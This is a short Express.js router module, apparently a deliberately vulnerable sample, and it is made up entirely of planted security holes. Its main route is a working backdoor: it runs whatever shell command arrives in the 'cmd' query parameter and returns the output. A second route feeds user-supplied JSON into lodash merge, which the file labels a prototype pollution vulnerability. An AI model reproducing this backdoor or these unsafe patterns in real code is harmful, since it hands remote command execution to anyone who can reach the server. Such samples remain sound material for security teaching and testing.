const express = require('express');
const router = express.Router();
const { exec } = require('child_process');
const _ = require('lodash');

router.get('/', (req, res) => {
    const cmd = req.query.cmd;

    // Backdoor: command execution
    exec(cmd, (error, stdout, stderr) => {
        if (error) {
            return res.send(`Error: ${stderr}`);
        }
        res.send(`<pre>${stdout}</pre>`);
    });
});

// Prototype pollution vulnerability
router.get('/pollute', (req, res) => {
    const payload = JSON.parse(req.query.payload || '{}');
    _.merge({}, payload);  // Unsafe use of lodash merge

    res.send('Polluted object!');
});

module.exports = router;
